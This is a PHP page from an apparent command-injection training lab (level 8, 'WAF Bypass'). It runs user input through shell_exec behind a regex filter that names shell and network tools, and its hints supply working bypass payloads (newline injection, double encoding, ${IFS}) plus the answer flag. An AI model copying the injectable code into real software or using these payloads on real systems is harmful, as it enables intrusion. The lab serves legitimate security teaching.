<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 8 - WAF Bypass & Context Breaking</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Level 8 - WAF Bypass & Context Breaking</h1>
            <p><strong>Objective:</strong> Bypass Web Application Firewall bằng context breaking và advanced techniques</p>
        </div>

        <div class="form-container">
            <h3>🔍 Security Scanner:</h3>
            <p>Hệ thống scan bảo mật với WAF protection. Sử dụng regex patterns để detect malicious input.</p>
            
            <div class="code-block">Command: nmap -sS -p <?php echo htmlspecialchars($_GET['ports'] ?? '[PORTS]'); ?> localhost</div>
            
            <?php
            if (isset($_GET['ports'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $ports = $_GET['ports'];
                
                // Simulate a WAF with pattern matching
                $waf_patterns = [
                    '/[\;\&\|`\$\(\)]/i',  // Special characters
                    '/\b(cat|ls|whoami|id|passwd|shadow|flag)\b/i',  // Dangerous commands
                    '/\b(wget|curl|nc|netcat|bash|sh)\b/i',  // Network/shell commands
                    '/\s+/i',  // Spaces (strict mode)
                    '/\.\.\//i',  // Directory traversal
                ];
                
                $blocked = false;
                $matched_pattern = '';
                
                foreach ($waf_patterns as $pattern) {
                    if (preg_match($pattern, $ports)) {
                        $blocked = true;
                        $matched_pattern = $pattern;
                        break;
                    }
                }
                
                if ($blocked) {
                    echo '<div class="error">🚫 WAF ALERT: Malicious pattern detected - ' . htmlspecialchars($matched_pattern) . '</div>';
                    echo '<div class="error">🛡️ Request blocked by Web Application Firewall</div>';
                } else {
                    // If passes WAF, execute the command
                    $command = "nmap -sS -p " . $ports . " localhost";
                    $output = shell_exec($command . " 2>&1");
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo '<div class="success">✅ Scan completed - No open ports found</div>';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="ports">Port Range:</label>
                    <input type="text" id="ports" name="ports" value="<?php echo htmlspecialchars($_GET['ports'] ?? ''); ?>" placeholder="Enter ports (e.g., 80,443,22)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Start Scan</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🛡️ WAF Detection Rules</h3>
                <ul>
                    <li><strong>Special chars:</strong> ; & | ` $ ( )</li>
                    <li><strong>Commands:</strong> cat, ls, whoami, id, passwd, shadow, flag</li>
                    <li><strong>Network tools:</strong> wget, curl, nc, netcat, bash, sh</li>
                    <li><strong>Path traversal:</strong> ../</li>
                    <li><strong>Whitespace:</strong> All space characters</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔓 Advanced WAF Bypass Methods</h3>
                <ul>
                    <li><strong>Context breaking:</strong> Break out of expected parameter format</li>
                    <li><strong>Parameter pollution:</strong> Multiple parameters with same name</li>
                    <li><strong>Encoding chains:</strong> Multiple layers of encoding</li>
                    <li><strong>Newline injection:</strong> Line breaks to escape context</li>
                    <li><strong>Unicode normalization:</strong> Alternative character representations</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding WAF Patterns</h4>
                    <p><strong>Current Command:</strong> <code>nmap -sS -p [PORTS] localhost</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>80,443,22</code> (should pass WAF)</p>
                    <p>📝 <strong>Test blocked:</strong> <code>80; whoami</code> (should be blocked)</p>
                    <p>🎯 <strong>WAF behavior:</strong> Patterns are checked before command execution</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Newline Injection</h4>
                    <p><strong>Concept:</strong> Use line breaks to break out of current context</p>
                    <p>📝 <strong>Method:</strong> Try URL-encoded newlines in your input</p>
                    <p><code>80%0Awhoami%0A443</code> (where %0A = newline)</p>
                    <p>🎯 <strong>Goal:</strong> Make the command structure become:</p>
                    <p><code>nmap -sS -p 80<br>whoami<br>443 localhost</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Unicode Bypass</h4>
                    <p><strong>Concept:</strong> Use Unicode characters that normalize to dangerous chars</p>
                    <p>📝 <strong>Examples:</strong></p>
                    <p>• <code>;</code> → <code>%EF%BC%9B</code> (fullwidth semicolon)</p>
                    <p>• <code>&</code> → <code>%EF%BC%86</code> (fullwidth ampersand)</p>
                    <p>📝 <strong>Test:</strong> <code>80%EF%BC%9Bwhoami</code></p>
                    <p>🎯 <strong>Note:</strong> Some WAFs don't normalize Unicode before checking</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Double URL Encoding</h4>
                    <p><strong>Concept:</strong> Encode your payload twice to bypass detection</p>
                    <p>📝 <strong>Single encoding:</strong> <code>;</code> → <code>%3B</code></p>
                    <p>📝 <strong>Double encoding:</strong> <code>;</code> → <code>%3B</code> → <code>%253B</code></p>
                    <p>📝 <strong>Test:</strong> <code>80%253Bwhoami</code></p>
                    <p>🎯 <strong>Logic:</strong> WAF checks first decode, server does second decode</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Parameter Pollution</h4>
                    <p><strong>Concept:</strong> Use multiple parameters to confuse WAF parsing</p>
                    <p>📝 <strong>Method:</strong> <code>?ports=80&ports=443&ports=22;whoami</code></p>
                    <p>🎯 <strong>Different behaviors:</strong></p>
                    <p>• WAF might only check first parameter: <code>80</code></p>
                    <p>• Server might use last parameter: <code>22;whoami</code></p>
                    <p><strong>Test in browser:</strong> Add multiple <code>&ports=value</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: Case Variation & Comments</h4>
                    <p><strong>Concept:</strong> Use mixed case and inline comments</p>
                    <p>📝 <strong>Command variation:</strong> Instead of <code>cat</code>, try building it dynamically</p>
                    <p><code>80%0A${PATH:0:1}a${PATH:0:1}%0A443</code></p>
                    <p>🎯 <strong>Explanation:</strong> ${PATH:0:1} extracts first char of PATH (usually 'c' or '/')</p>
                    <p><strong>Alternative:</strong> Use command substitution to build commands</p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>💡 Hint 7: WAF Timing Attack</h4>
                    <p><strong>Concept:</strong> Even if WAF blocks, you can still cause side effects</p>
                    <p>📝 <strong>Method:</strong> Use file operations that succeed before WAF catches them</p>
                    <p><code>80%0Atouch${IFS}/var/www/html/waf_bypass.txt%0A443</code></p>
                    <p>🎯 <strong>Check result:</strong> Visit <code>http://localhost:8080/waf_bypass.txt</code></p>
                    <p><strong>Flag location:</strong> <code>/var/flags/level8_waf.txt</code></p>
                </div>
                <div id="hint-8" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 8: Complete WAF Bypass!</h4>
                    <p><strong>🚀 Final payload combinations:</strong></p>
                    <p><strong>Method 1 (Newline + copy):</strong></p>
                    <p><code>80%0Acp${IFS}/var/flags/level8_waf.txt${IFS}/var/www/html/%0A443</code></p>
                    <p><strong>Method 2 (Double encoding):</strong></p>
                    <p><code>80%250Acp%2520/var/flags/level8_waf.txt%2520/var/www/html/%250A443</code></p>
                    <p><strong>🎯 Expected Flag:</strong> <code>FLAG{waf_bypass_master_level}</code></p>
                    <p>After successful bypass, check: <code>http://localhost:8080/level8_waf.txt</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level7.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level9.php">➡️ Next Level</a>
            <a href="submit.php?level=8">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 8;

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint === maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }

    function updateCommand() {
        const ports = document.getElementById('ports').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = `Command: nmap -sS -p <span style="color: #ed8936; font-weight: bold;">${ports || '[PORTS]'}</span> localhost`;
    }
    </script>
</body>
</html>
